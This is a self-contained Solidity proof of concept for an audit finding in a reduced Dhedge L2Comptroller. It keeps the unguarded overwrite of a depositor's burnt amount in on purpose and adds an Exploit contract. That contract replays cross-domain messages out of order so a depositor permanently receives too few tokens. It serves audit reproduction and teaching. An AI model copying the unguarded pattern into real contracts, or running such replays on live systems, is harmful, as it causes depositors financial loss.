// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Dhedge L2Comptroller — user can receive too few tokens when unpaused
    (Zach Obront review, finding #18772 / H-01) — HIGH

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    L2Comptroller.buyBackFromL1 assignment is inlined VERBATIM together with the
    verbatim `assert(totalAmountClaimed <= totalAmountBurntOnL1)`; the cross-domain
    replay is modelled by directly calling buyBackFromL1 out of order (the report
    notes anyone can trigger it in Bedrock). No fork, no RPC, no cheatcodes.
//////////////////////////////////////////////////////////////////////////*/


/*//////////////////////////////////////////////////////////////
    Dhedge L2Comptroller v1 — cross-domain replay under-credits a depositor
    Finding 18772 (Zach Obront, ZachObront) — HIGH

    Root cause: buyBackFromL1() records the depositor's cumulative L1-burnt
    amount with a plain overwrite —

        l1BurntAmountOf[l1Depositor] = totalAmountBurntOnL1;

    — with NO check that the value is monotonically increasing. On Optimism
    Bedrock, a message whose relay reverted (e.g. the comptroller was paused, or
    had no MTy to distribute) is moved to a `failed` state and can be REPLAYED by
    ANYONE, in ANY order. Two deposits — an earlier one for X and a later one for
    X + N — can therefore be replayed out of order: the later (X + N) message is
    relayed first, then the earlier (X) message overwrites l1BurntAmountOf back
    down to X. When the depositor finally claims (once the pool is funded), they
    receive only X tokens instead of the X + N they burnt on L1 — a permanent
    loss of N.

    This file is a self-contained reduction. It keeps the vulnerable assignment
    and the `assert` VERBATIM, preserves the "try _buyBack; do NOT update
    claimedAmountOf on failure" behaviour, and models MTA -> MTy as a 1:1 buy
    back so the shortfall becomes a measurable token loss. The Optimism
    CrossDomainMessenger is omitted (the report states the replay is
    permissionless), so the out-of-order replay is expressed as two direct
    buyBackFromL1 calls against an empty pool.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used for both tokenToBurn (MTA) and tokenToBuy (MTy).
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Dhedge L2Comptroller. Depositors burn `tokenToBurn` (MTA) on
///         L1; a cross-domain message credits them here via buyBackFromL1, which
///         records l1BurntAmountOf and tries to distribute `tokenToBuy` (MTy)
///         1:1. Depositors later pull their MTy with claimAll based on
///         (l1BurntAmountOf - claimedAmountOf).
contract L2Comptroller {
    MockERC20 public immutable tokenToBurn; // MTA (burnt on L1)
    MockERC20 public immutable tokenToBuy; // MTy (distributed on L2, 1:1)

    address public owner;
    bool public paused;

    // cumulative MTA burnt on L1 per depositor, as reported by the L1 message
    mapping(address => uint256) public l1BurntAmountOf;
    // cumulative MTA-denominated amount already claimed/bought-back on L2
    mapping(address => uint256) public claimedAmountOf;

    error ExceedingClaimableAmount(address depositor, uint256 wanted, uint256 available);
    error OnlySelf();
    error OnlyOwner();
    error Paused();

    constructor(MockERC20 _tokenToBurn, MockERC20 _tokenToBuy) {
        tokenToBurn = _tokenToBurn;
        tokenToBuy = _tokenToBuy;
        owner = msg.sender;
    }

    modifier whenNotPaused() {
        if (paused) revert Paused();
        _;
    }

    function pause() external {
        if (msg.sender != owner) revert OnlyOwner();
        paused = true;
    }

    function unpause() external {
        if (msg.sender != owner) revert OnlyOwner();
        paused = false;
    }

    /// @notice Credit a depositor for MTA burnt on L1 and attempt the MTy buy back.
    ///         In production this is delivered by Optimism's CrossDomainMessenger;
    ///         a message whose relay reverted (paused, or pool empty) can be
    ///         REPLAYED by anyone, in any order — which is what this reproduces.
    function buyBackFromL1(address l1Depositor, address receiver, uint256 totalAmountBurntOnL1)
        external
        whenNotPaused
    {
        // `totalAmountClaimed` is of the `tokenToBurn` denomination.
        uint256 totalAmountClaimed = claimedAmountOf[l1Depositor];

        // The cumulative token amount burnt and claimed against on L2 should never be less than
        // what's been burnt on L1. This indicates some serious issues.
        assert(totalAmountClaimed <= totalAmountBurntOnL1);

        // The difference of both these variables tell us the claimable token amount in `tokenToBurn`
        // denomination.
        uint256 burnTokenAmount = totalAmountBurntOnL1 - totalAmountClaimed;

        if (burnTokenAmount == 0) {
            revert ExceedingClaimableAmount(l1Depositor, 0, 0);
        }

        // RECOMMENDED FIX (dHEDGE PR #17) — enforce monotonic increase:
        //   if (totalAmountBurntOnL1 < l1BurntAmountOf[l1Depositor]) revert DecreasingBurntAmount();
        // Store the new total amount of tokens burnt on L1 and claimed against on L2.
        l1BurntAmountOf[l1Depositor] = totalAmountBurntOnL1; // @> VULN: no monotonic-increase guard — an out-of-order replay carrying a SMALLER totalAmountBurntOnL1 overwrites a previously-recorded larger value, permanently under-crediting the depositor

        // Try to buy back and transfer the MTy now. If the pool is empty this
        // reverts; we swallow it and DO NOT update claimedAmountOf, so the amount
        // stays claimable later (this is exactly the window the replay exploits).
        try this._buyBack(receiver, burnTokenAmount) returns (uint256) {
            claimedAmountOf[l1Depositor] += burnTokenAmount;
        } catch {
            // no MTy to transfer right now; leave claimedAmountOf unchanged
        }
    }

    /// @notice Pull all MTy the caller is (currently) credited for.
    function claimAll(address receiver) external whenNotPaused {
        uint256 claimable = l1BurntAmountOf[msg.sender] - claimedAmountOf[msg.sender];
        if (claimable == 0) revert ExceedingClaimableAmount(msg.sender, 0, 0);

        // buy back the whole claimable balance; reverts if the pool is short.
        this._buyBack(receiver, claimable);
        claimedAmountOf[msg.sender] += claimable;
    }

    /// @notice Convert an MTA (tokenToBurn) amount into MTy (tokenToBuy) and pay it
    ///         to `receiver`. External so buyBackFromL1 can wrap it in try/catch.
    function _buyBack(address receiver, uint256 burnTokenAmount) external returns (uint256 buyTokenAmount) {
        if (msg.sender != address(this)) revert OnlySelf();

        // 1:1 conversion (MTA -> MTy) in this reduction.
        buyTokenAmount = burnTokenAmount;

        uint256 available = tokenToBuy.balanceOf(address(this));
        if (buyTokenAmount > available) {
            // not enough MTy in the pool -> revert (buyBackFromL1's try/catch handles it)
            revert ExceedingClaimableAmount(receiver, buyTokenAmount, available);
        }
        tokenToBuy.transfer(receiver, buyTokenAmount);
    }

    /// @notice 1:1 view helper mirroring the real convert functions.
    function convertToTokenToBuy(uint256 burnAmount) external pure returns (uint256) {
        return burnAmount;
    }
}

/// @dev The innocent depositor (victim). Burnt MTA on L1; pulls MTy on L2.
contract Depositor {
    function claim(L2Comptroller comptroller) external {
        comptroller.claimAll(address(this));
    }
}

/// @dev Attack orchestrator / deployer. Sets up the comptroller with an EMPTY
///      MTy pool, replays the two cross-domain messages OUT OF ORDER (2e18 then
///      1e18) so l1BurntAmountOf is clamped down to 1e18, then funds the pool and
///      lets the victim claim — realising the permanent shortfall (one tx, no cheats).
contract Exploit {
    uint256 public constant EARLIER_BURN = 1 ether; // first L1 deposit: X
    uint256 public constant LATER_BURN = 2 ether; // second L1 deposit: X + N (N = 1e18)

    MockERC20 public tokenToBurn; // MTA
    MockERC20 public tokenToBuy; // MTy
    L2Comptroller public comptroller;
    Depositor public victim;
    address public attacker;

    constructor() {
        attacker = msg.sender;
        tokenToBurn = new MockERC20("Meta (MTA)", "MTA"); // CREATE nonce 1
        tokenToBuy = new MockERC20("Toros (MTy)", "MTy"); // CREATE nonce 2
        comptroller = new L2Comptroller(tokenToBurn, tokenToBuy); // CREATE nonce 3
        victim = new Depositor(); // CREATE nonce 4
    }

    function run() external {
        // The MTy pool starts EMPTY, so the initial buy-backs fail and their
        // cross-domain messages are marked `failed` (replayable by anyone).

        // === out-of-order replay: relay the LATER (larger) message first ... ===
        comptroller.buyBackFromL1(address(victim), address(victim), LATER_BURN); // records 2e18
        // ... then the EARLIER (smaller) message, which OVERWRITES it back to 1e18.
        comptroller.buyBackFromL1(address(victim), address(victim), EARLIER_BURN); // clamps to 1e18

        // The depositor is now under-credited: credited 1e18 though 2e18 was burnt on L1.
        require(comptroller.l1BurntAmountOf(address(victim)) == EARLIER_BURN, "not clamped low");
        require(comptroller.claimedAmountOf(address(victim)) == 0, "unexpected claim");

        // === later the comptroller is funded with plenty of MTy ===
        tokenToBuy.mint(address(comptroller), 10 ether);

        // === victim claims everything they are (mis-)credited for ===
        victim.claim(comptroller);

        // HARM: the victim receives only 1e18 MTy though 2e18 was burnt on L1 for
        // them — a permanent, unrecoverable shortfall of 1e18. The remaining 1e18
        // MTy stays stranded in the comptroller, undistributable to this victim.
        require(tokenToBuy.balanceOf(address(victim)) == EARLIER_BURN, "victim not short-changed");
        require(comptroller.l1BurntAmountOf(address(victim)) == EARLIER_BURN, "credit not clamped");
        require(tokenToBuy.balanceOf(address(comptroller)) == 10 ether - EARLIER_BURN, "no stranded funds");
    }
}
